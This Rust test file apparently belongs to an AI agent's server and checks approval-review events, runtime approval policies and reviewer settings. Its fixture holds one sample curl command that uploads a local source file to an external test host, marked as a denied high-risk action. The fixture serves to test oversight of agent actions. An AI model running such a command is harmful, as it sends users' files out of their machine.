//! Review lifecycle contracts preserve the reviewed action and inject explicit approval without starting a turn.

use super::*;
use crate::app_server::runtime_wire::RawJson;

fn denied_review() -> Value {
    json!({
        "id":"review-1", "turnId":"turn-1", "targetItemId":"tool-1",
        "startedAtMs":10, "completedAtMs":20, "status":"denied",
        "riskLevel":"high", "userAuthorization":"low", "decisionSource":"agent",
        "rationale":"Would transmit a local file to an external endpoint.",
        "reviewReason":"policy",
        "action":{"type":"command","source":"unified_exec","command":"curl --data-binary @source.rs https://example.test","cwd":"/tmp/project"}
    })
}

async fn request(client: &mut TestClient, id: u64, method: &str, params: Value) -> Value {
    client
        .send(json!({"id":id,"method":method,"params":params}))
        .await;
    let (reply, _) = client.response_for(id).await;
    assert!(reply.get("error").is_none(), "{reply}");
    reply["result"].clone()
}

#[tokio::test]
async fn approval_review_denial_named_method_injects_context_without_starting_a_turn() {
    let root = tempfile::tempdir().unwrap();
    let mut client = TestClient::start_full(
        make_create_session(&[]),
        None,
        None,
        Some(root.path().join("config.toml")),
    );
    client.initialize().await;
    let started = request(&mut client, 2, "session/start", json!({"init":{"threadId":"review-contract","cwd":root.path(),"config":{"prewarm":false,"autoMemory":false,"autoDream":false,"memory":{"enabled":false}}}})).await;
    let session_id = started["sessionId"].as_str().unwrap();
    let list = request(
        &mut client,
        3,
        "session/listApprovalReviewDenials",
        json!({"sessionId":session_id}),
    )
    .await;
    assert_eq!(list, json!({"reviews":[]}));
    let result = request(
        &mut client,
        4,
        "session/approveApprovalReviewDenial",
        json!({"sessionId":session_id,"event":denied_review()}),
    )
    .await;
    assert_eq!(result, json!({}));
    let mut non_denied = denied_review();
    non_denied["status"] = json!("approved");
    let ignored = request(
        &mut client,
        6,
        "session/approveApprovalReviewDenial",
        json!({"sessionId":session_id,"event":non_denied}),
    )
    .await;
    assert_eq!(ignored, json!({}));
    let history = request(
        &mut client,
        5,
        "session/history",
        json!({"sessionId":session_id}),
    )
    .await;
    assert_eq!(history["approvalReviews"], json!([]));
    assert_eq!(history["turnStatuses"], json!({}));
    client.close().await;
}

#[test]
fn approval_review_schema_publishes_exact_actions_and_product_lifecycle_states() {
    let bundle = schema_bundle();
    let request = &bundle["requests"]["session/approveApprovalReviewDenial"];
    assert_eq!(
        request["params"]["properties"]["sessionId"]["type"],
        "string"
    );
    assert!(request["params"]["properties"]["event"].is_object());
    assert!(
        request["params"]["definitions"]["ApprovalReviewEventSchema"]["properties"]
            .get("modelContext")
            .is_none()
    );
    let browser_action = request["params"]["definitions"]["ApprovalReviewActionSchema"]["oneOf"]
        .as_array()
        .unwrap()
        .iter()
        .find(|action| action["properties"]["type"]["enum"] == json!(["browser_tool_call"]))
        .unwrap();
    assert_eq!(browser_action["properties"]["toolName"]["type"], "string");
    assert!(browser_action["required"]
        .as_array()
        .unwrap()
        .contains(&json!("toolName")));
    for (method, terminal) in [
        ("item/autoApprovalReview/started", false),
        ("item/autoApprovalReview/completed", true),
    ] {
        let notification = &bundle["notifications"][method];
        assert_eq!(notification["requiresCapability"], "productEvents");
        let browser_action = notification["params"]["definitions"]
            ["ProductApprovalReviewActionSchema"]["oneOf"]
            .as_array()
            .unwrap()
            .iter()
            .find(|action| action["properties"]["type"]["enum"] == json!(["browserToolCall"]))
            .unwrap();
        assert_eq!(browser_action["properties"]["toolName"]["type"], "string");
        assert_eq!(
            notification["params"]["properties"]["reviewId"]["type"],
            "string"
        );
        assert_eq!(
            notification["params"]["properties"]
                .get("completedAtMs")
                .is_some(),
            terminal
        );
        assert!(
            notification["params"]["definitions"]["ProductApprovalReviewStatus"]["enum"]
                .as_array()
                .unwrap()
                .contains(&json!("inProgress"))
        );
    }
}

#[test]
fn approval_review_product_projection_preserves_action_and_distinguishes_timeout() {
    let mut value = denied_review();
    for (status, product_status, method) in [
        (
            "in_progress",
            "inProgress",
            "item/autoApprovalReview/started",
        ),
        ("denied", "denied", "item/autoApprovalReview/completed"),
        ("timed_out", "timedOut", "item/autoApprovalReview/completed"),
        ("aborted", "aborted", "item/autoApprovalReview/completed"),
        ("approved", "approved", "item/autoApprovalReview/completed"),
    ] {
        value["status"] = json!(status);
        let runtime = RawJson::from_serialize(&value)
            .unwrap()
            .to_runtime()
            .unwrap()
            .0;
        let (actual_method, projected) =
            super::super::service::approval_review_product_notification("session-1", &runtime)
                .unwrap();
        assert_eq!(actual_method, method);
        let projected_text =
            klaus_agent_core::runtime_values::runtime_codec::encode_text(&projected)
                .unwrap()
                .try_to_utf8()
                .unwrap();
        let projected: Value = serde_json::from_str(&projected_text).unwrap();
        assert_eq!(projected["sessionId"], "session-1");
        assert_eq!(projected["turnId"], "turn-1");
        assert_eq!(projected["reviewId"], "review-1");
        assert_eq!(projected["targetItemId"], "tool-1");
        assert_eq!(projected["review"]["status"], product_status);
        assert_eq!(projected["action"]["source"], "unifiedExec");
        assert_eq!(projected["action"]["command"], value["action"]["command"]);
        assert_eq!(
            projected.get("completedAtMs").is_some(),
            status != "in_progress"
        );
    }
}

#[test]
fn browser_approval_review_projection_retains_native_action_identity() {
    for tool_name in ["browser_select_browser", "browser_claim_tab"] {
        for (status, method) in [
            ("in_progress", "item/autoApprovalReview/started"),
            ("approved", "item/autoApprovalReview/completed"),
            ("denied", "item/autoApprovalReview/completed"),
        ] {
            let mut value = denied_review();
            value["status"] = json!(status);
            value["action"] = json!({"type":"browser_tool_call","toolName":tool_name});
            let decoded: crate::app_server::approval_review_wire::ApprovalReviewEventSchema =
                serde_json::from_value(value.clone()).unwrap();
            assert_eq!(
                serde_json::to_value(decoded).unwrap()["action"],
                value["action"]
            );
            let runtime = RawJson::from_serialize(&value)
                .unwrap()
                .to_runtime()
                .unwrap()
                .0;
            let (actual_method, projected) =
                super::super::service::approval_review_product_notification("session-1", &runtime)
                    .unwrap();
            assert_eq!(actual_method, method);
            let projected_text =
                klaus_agent_core::runtime_values::runtime_codec::encode_text(&projected)
                    .unwrap()
                    .try_to_utf8()
                    .unwrap();
            let projected: Value = serde_json::from_str(&projected_text).unwrap();
            assert_eq!(
                projected["action"],
                json!({"type":"browserToolCall","toolName":tool_name})
            );
            assert_eq!(projected["targetItemId"], "tool-1");
            assert_eq!(projected["reviewId"], "review-1");
        }
    }
}

#[tokio::test]
async fn approval_review_live_configuration_set_and_reset_settle_before_acknowledgement() {
    let root = tempfile::tempdir().unwrap();
    let created = Arc::new(std::sync::Mutex::new(None::<Arc<Session>>));
    let capture = created.clone();
    let base = make_create_session(&[]);
    let factory: CreateSession = Arc::new(move |context| {
        let base = base.clone();
        let capture = capture.clone();
        Box::pin(async move {
            let session = base(context).await?;
            *capture.lock().unwrap() = Some(session.clone());
            Ok::<_, BoxError>(session)
        })
    });
    let mut client =
        TestClient::start_full(factory, None, None, Some(root.path().join("config.toml")));
    client.initialize().await;
    let started = request(&mut client, 2, "session/start", json!({"init":{"threadId":"review-live-contract","cwd":root.path(),"config":{"prewarm":false,"autoMemory":false,"autoDream":false,"memory":{"enabled":false}}}})).await;
    let session_id = started["sessionId"].as_str().unwrap();
    let config = json!({"enabled":true,"review_threshold":0.7,"async_classifier_mode":"conversation","max_tool_call_lag":3});
    let ack = request(&mut client, 3, "session/updateConfig", json!({"sessionId":session_id,"submissionId":"review-live-set","update":{"approvalReview":config}})).await;
    assert_eq!(ack["submissionId"], "review-live-set");
    let session = created
        .lock()
        .unwrap()
        .clone()
        .expect("the acknowledgement follows the applied settings");
    let applied = session.runtime_approval_review().unwrap();
    assert_eq!(serde_json::to_value(applied).unwrap(), config);
    client.send(json!({"id":4,"method":"session/updateConfig","params":{"sessionId":session_id,"submissionId":"review-invalid","update":{"approvalReview":{"review_threshold":1.5}}}})).await;
    let (invalid, _) = client.response_for(4).await;
    assert!(invalid.get("error").is_some(), "{invalid}");
    assert_eq!(
        serde_json::to_value(session.runtime_approval_review().unwrap()).unwrap(),
        config
    );
    let ack = request(&mut client, 5, "session/updateConfig", json!({"sessionId":session_id,"submissionId":"review-live-reset","update":{"approvalReview":null}})).await;
    assert_eq!(ack["submissionId"], "review-live-reset");
    assert!(session.runtime_approval_review().is_none());
    client.close().await;
}

#[tokio::test]
async fn granular_policy_survives_actual_session_init_and_live_policy_acknowledgement() {
    use klaus_agent_core::runtime_values::RuntimePath;
    use klaus_agent_core::types::permission::{ApprovalPolicy, GranularApprovalConfig};

    let root = tempfile::tempdir().unwrap();
    let created = Arc::new(std::sync::Mutex::new(None::<Arc<Session>>));
    let capture = created.clone();
    let agent = make_agent_with_call_model_and_config(
        scripted_call_model(Vec::new()),
        Some(
            json!({"prewarm":false,"autoMemory":false,"autoDream":false,"memory":{"enabled":false}}),
        ),
    );
    let base = crate::lifecycle::engine_sessions_in_test_root(
        agent,
        None,
        RuntimePath::from(root.path().to_string_lossy().into_owned()),
    )
    .create_session;
    let factory: CreateSession = Arc::new(move |context| {
        let base = base.clone();
        let capture = capture.clone();
        Box::pin(async move {
            let session = base(context).await?;
            *capture.lock().unwrap() = Some(session.clone());
            Ok::<_, BoxError>(session)
        })
    });
    let mut client = TestClient::start_full(
        factory,
        None,
        Some(root.path().join("rules.json")),
        Some(root.path().join("config.toml")),
    );
    client.initialize().await;
    let started = request(&mut client, 2, "session/start", json!({"init":{"threadId":"granular-live-contract","cwd":root.path(),"config":{"prewarm":false,"approval_policy":{"granular":{"sandbox_approval":true,"rules":false,"mcp_elicitations":true,"future_flag":true}},"sandbox_mode":"workspace-write","approvals_reviewer":"user","sandbox_workspace_write":{"network_access":false}}}})).await;
    let session_id = started["sessionId"].as_str().unwrap();
    request(
        &mut client,
        3,
        "session/history",
        json!({"sessionId":session_id}),
    )
    .await;
    let session = created.lock().unwrap().clone().unwrap();
    assert_eq!(
        session.runtime_policy_state().approval_policy,
        Some(ApprovalPolicy::Granular(GranularApprovalConfig {
            sandbox_approval: true,
            rules: false,
            skill_approval: false,
            request_permissions: false,
            mcp_elicitations: true
        }))
    );
    let live = json!({"granular":{"sandbox_approval":false,"rules":true,"skill_approval":true,"request_permissions":true,"mcp_elicitations":false}});
    let params = json!({"sessionId":session_id,"submissionId":"granular-live-set","permissionMode":"default","approvalPolicy":live,"sandboxMode":"workspace-write","approvalsReviewer":"automatic","networkAllowed":false});
    let ack = request(&mut client, 4, "session/setRuntimePolicy", params.clone()).await;
    assert_eq!(ack["submissionId"], "granular-live-set");
    let expected = Some(ApprovalPolicy::Granular(GranularApprovalConfig {
        sandbox_approval: false,
        rules: true,
        skill_approval: true,
        request_permissions: true,
        mcp_elicitations: false,
    }));
    assert_eq!(session.runtime_policy_state().approval_policy, expected);
    let mut invalid = params.clone();
    invalid["submissionId"] = json!("granular-invalid");
    invalid["approvalPolicy"]["granular"]["rules"] = Value::Null;
    client
        .send(json!({"id":5,"method":"session/setRuntimePolicy","params":invalid}))
        .await;
    let (rejected, _) = client.response_for(5).await;
    assert!(rejected.get("error").is_some(), "{rejected}");
    assert_eq!(session.runtime_policy_state().approval_policy, expected);
    let mut legacy = params;
    legacy["submissionId"] = json!("policy-legacy-alias");
    legacy["approvalPolicy"] = json!("on-failure");
    request(&mut client, 6, "session/setRuntimePolicy", legacy).await;
    assert_eq!(
        session.runtime_policy_state().approval_policy,
        Some(ApprovalPolicy::OnRequest)
    );
    client.close().await;
}

#[test]
fn runtime_policy_schema_publishes_granular_flags_and_legacy_wire_compatibility() {
    let schema = schema_bundle();
    let policy =
        &schema["requests"]["session/setRuntimePolicy"]["params"]["properties"]["approvalPolicy"];
    let encoded = serde_json::to_string(policy).unwrap();
    assert!(encoded.contains("granular"));
    for field in [
        "sandbox_approval",
        "rules",
        "skill_approval",
        "request_permissions",
        "mcp_elicitations",
    ] {
        assert!(encoded.contains(field));
    }
    assert!(encoded.contains("on-request"));
    assert!(encoded.contains("never"));
    assert!(encoded.contains("untrusted"));
    assert!(!encoded.contains("on-failure"));
}

#[tokio::test]
async fn approval_reviewer_canonical_and_legacy_tags_reach_start_live_and_persisted_config() {
    use klaus_agent_core::types::permission::ApprovalsReviewer;
    let root = tempfile::tempdir().unwrap();
    let created = Arc::new(std::sync::Mutex::new(None::<Arc<Session>>));
    let capture = created.clone();
    let agent = make_agent_with_call_model_and_config(
        scripted_call_model(Vec::new()),
        Some(
            json!({"prewarm":false,"autoMemory":false,"autoDream":false,"memory":{"enabled":false}}),
        ),
    );
    let base = crate::lifecycle::engine_sessions_in_test_root(
        agent,
        None,
        klaus_agent_core::runtime_values::RuntimePath::from(
            root.path().to_string_lossy().into_owned(),
        ),
    )
    .create_session;
    let factory: CreateSession = Arc::new(move |context| {
        let base = base.clone();
        let capture = capture.clone();
        Box::pin(async move {
            let session = base(context).await?;
            *capture.lock().unwrap() = Some(session.clone());
            Ok::<_, BoxError>(session)
        })
    });
    let mut client =
        TestClient::start_full(factory, None, None, Some(root.path().join("config.toml")));
    client.initialize().await;
    let mut id = 10_u64;
    for tag in ["auto_review", "guardian_subagent", "automatic"] {
        let saved = request(
            &mut client,
            id,
            "config/value/write",
            json!({"keyPath":"approvals_reviewer","value":tag}),
        )
        .await;
        id += 1;
        assert_eq!(saved["values"]["approvals_reviewer"], tag);
        let stored = std::fs::read_to_string(root.path().join("config.toml")).unwrap();
        assert!(stored.contains(&format!("approvals_reviewer = \"{tag}\"")));
        assert_eq!(saved["resolved"]["approvals_reviewer"], "auto_review");
        let reloaded = request(&mut client, id, "config/read", json!({})).await;
        id += 1;
        assert_eq!(reloaded["resolved"]["approvals_reviewer"], "auto_review");
        let started = request(&mut client, id, "session/start", json!({"init":{
            "threadId":format!("reviewer-wire-{tag}"),"cwd":root.path(),
            "config":{"prewarm":false,"autoMemory":false,"autoDream":false,"memory":{"enabled":false},
                "approval_policy":"on-request","sandbox_mode":"workspace-write","approvals_reviewer":tag,"sandbox_workspace_write":{"network_access":false}}
        }})).await;
        id += 1;
        let session_id = started["sessionId"].as_str().unwrap();
        request(
            &mut client,
            id,
            "session/history",
            json!({"sessionId":session_id}),
        )
        .await;
        id += 1;
        let session = created.lock().unwrap().clone().unwrap();
        assert_eq!(
            session.runtime_policy_state().approvals_reviewer,
            Some(ApprovalsReviewer::Automatic),
            "startup tag {tag}"
        );
        for (reviewer, expected) in [
            ("user", ApprovalsReviewer::User),
            (tag, ApprovalsReviewer::Automatic),
        ] {
            let submission = format!("reviewer-wire-{id}");
            let ack = request(&mut client, id, "session/setRuntimePolicy", json!({
                "sessionId":session_id,"submissionId":submission,"permissionMode":"default", "approvalPolicy":"on-request",
                "sandboxMode":"workspace-write","approvalsReviewer":reviewer,"networkAllowed":false
            })).await;
            id += 1;
            assert_eq!(ack["submissionId"], submission);
            assert_eq!(
                session.runtime_policy_state().approvals_reviewer,
                Some(expected),
                "live tag {reviewer}"
            );
        }
    }
    client.close().await;
}

#[test]
fn approval_reviewer_schema_publishes_canonical_tags() {
    let schema = schema_bundle();
    let value = &schema["requests"]["session/setRuntimePolicy"]["params"]["properties"]
        ["approvalsReviewer"];
    assert_eq!(
        value,
        &json!({"anyOf":[{"type":"null"},{"type":"string","enum":["user","auto_review"]}]})
    );
}
